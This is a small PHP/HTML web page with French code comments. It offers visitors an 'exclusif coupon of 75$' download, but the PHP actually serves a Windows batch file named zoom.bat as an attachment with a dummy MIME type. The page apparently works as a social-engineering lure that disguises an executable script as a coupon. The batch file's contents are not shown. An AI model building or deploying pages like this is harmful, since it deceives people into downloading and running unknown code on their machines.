<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Document sans nom</title>
<style type="text/css">
<!--
.Style3 {color: #FFFFFF; font-weight: bold; }
.Style4 {color: #9FE8FF}
.Style5 {
	font-size: 18px;
	font-weight: bold;
	color: #FFFFFF;
	font-family: Arial, Helvetica, sans-serif;
}
-->
</style>
</head>

<body>

<?php 

// Liste des documents disponibles en téléchargement
$documents = array("zoom.bat"); 

// Traitement du formulaire si $_GET non vide. 
if (! empty($_GET))
{ 
	// Récupére l'identifiant du document. 
	$iIdFile = $_GET["id"]; 

	// En déduire le nom du document. 
	$sFilename = $documents[$iIdFile]; 

	// Envoye l'entête d'attachement. 
	$header  = "Content-Disposition: attachment; "; 
	$header .= "filename=$sFilename\n" ; 
	header($header); 

	// Envoye l'entête du type MIME (ici, "inconnu"). 
	header("Content-Type: x/y\n"); 

	// Envoye le document. 
	readfile($sFilename); 
} 


?> 

<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="3%" bgcolor="#666666">&nbsp;</td>
    <td width="3%" bgcolor="#666666">&nbsp;</td>
    <td width="3%" bgcolor="#666666">&nbsp;</td>
    <td width="3%" bgcolor="#666666">&nbsp;</td>
    <td width="3%" bgcolor="#666666">&nbsp;</td>
    <td width="3%" bgcolor="#666666">&nbsp;</td>
    <td width="3%" bgcolor="#666666">&nbsp;</td>
    <td width="31%" bgcolor="#666666">&nbsp;</td>
    <td width="12%" bgcolor="#666666">&nbsp;</td>
    <td width="12%" bgcolor="#666666">&nbsp;</td>
    <td width="7%" bgcolor="#666666">&nbsp;</td>
    <td width="17%" bgcolor="#666666">&nbsp;</td>
  </tr>
  <tr>
    <td colspan="12" bgcolor="#666666"><div align="center"><img src="zh.PNG" width="1297" height="101" /></div></td>
  </tr>
  <tr>
    <td colspan="12" bgcolor="#9FE8FF"><span class="Style4"></span><span class="Style4"></span><span class="Style4"></span><span class="Style4"></span><span class="Style4"></span><span class="Style4"></span><span class="Style4"></span><span class="Style4"></span><span class="Style4"></span><span class="Style4"></span><span class="Style4"></span><span class="Style4"></span></td>
  </tr>
  
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td><p>&nbsp;</p>
    <p>&nbsp;</p></td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td colspan="6" rowspan="4"><p>&nbsp;</p>
      <table width="1012" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td width="291">&nbsp;</td>
          <td width="559">&nbsp;</td>
          <td width="162">&nbsp;</td>
        </tr>
        <tr>
          <td height="36"><img src="coupon.PNG" width="291" height="151" /></td>
          <td bgcolor="#0066FF"><div align="center">
            <?php 

    // Parcours la liste des documents et utilise le nom 
    // pour l'affichage et l'identifiant dans l'URL. 
    foreach($documents as $iIdFile => $document)
    { 
		    echo "<font color=White size=6><a style=color:#FFFFFF href=\"file.php?id=$iIdFile\">"."DownLoad your exclusif coupon of 75$"."</a></font>"; 
	
    } 

    ?></div></td>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
      </table>
      <p>&nbsp;</p>    </td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td colspan="12" bgcolor="#CCCCCC"><div align="center"><img src="zb.PNG" width="1263" height="760" /></div></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td colspan="12">&nbsp;</td>
  </tr>
</table>
</body>
</html>
